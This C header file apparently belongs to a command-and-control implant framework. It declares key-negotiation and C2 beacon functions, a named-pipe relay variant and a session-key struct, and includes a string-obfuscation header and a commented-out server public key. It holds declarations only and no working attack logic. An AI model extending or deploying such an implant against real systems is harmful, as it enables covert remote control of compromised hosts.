#pragma once
// protobuf, libsodium
#include <pb_common.h>
#include <pb_encode.h>
#include <pb_decode.h>
#include "message.pb.h"
#include <sodium.h>
// string obfuscation
#include "strings_main.h"
#include "laikabox.h"

#include "internet.h"
#include "pipe_server_client.h"
#include "helpers.h"


// #define SERVER_PK_B64   "H9luw7Iil2BrayAS9Pu2yrvirN/fdZ9oqPFyk99lYQ8="


typedef struct beacon_param {
    uint8_t* client_guid_ephemeral; 
    uint8_t* suburl_bin;
    uint8_t* nonce_send; 
    uint8_t* session_key_send;
    uint8_t* nonce_rcv;
    uint8_t* session_key_rcv;
    uint8_t* key_kdf_guid; 
    uint8_t* key_kdf_send; 
    uint8_t* key_kdf_rcv;
} BEACON_PARAM; 

DWORD key_negotiation_new(char* client_guid_real_b64,
                          uint8_t* nonce_send, uint8_t* nonce_rcv, uint8_t* suburl_bin,
                          uint8_t* key_kdf_send, uint8_t* key_kdf_rcv, uint8_t* key_kdf_guid,
                          uint8_t* session_key_send, uint8_t* session_key_rcv, uint8_t* client_guid_ephemeral);

DWORD key_negotiation_client_mode(char* client_guid_real_b64,
                          uint8_t* nonce_send, uint8_t* nonce_rcv, uint8_t* suburl_bin,
                          uint8_t* key_kdf_send, uint8_t* key_kdf_rcv, uint8_t* key_kdf_guid,
                          uint8_t* session_key_send, uint8_t* session_key_rcv, uint8_t* client_guid_ephemeral,
                          char* pipeFullPath);

DWORD beacon_c2(uint8_t* client_guid_ephemeral, uint8_t* suburl_bin, char* client_guid_real_b64, 
                    uint8_t* nonce_send, uint8_t* session_key_send,
                    uint8_t* nonce_rcv, uint8_t* session_key_rcv,
                    uint8_t* buffer_decrypt_decode_rcv, size_t* actualDecryptedSize,
                    uint8_t* key_kdf_guid, uint8_t* key_kdf_send, uint8_t* key_kdf_rcv);

DWORD beacon_c2_client(uint8_t* client_guid_ephemeral, uint8_t* suburl_bin, char* client_guid_real_b64, 
                        uint8_t* nonce_send, uint8_t* session_key_send,
                        uint8_t* nonce_rcv, uint8_t* session_key_rcv,
                        uint8_t* buffer_decrypt_decode_rcv, size_t* actualDecryptedSize,
                        uint8_t* key_kdf_guid, uint8_t* key_kdf_send, uint8_t* key_kdf_rcv, 
                        char* pipeFullPath);


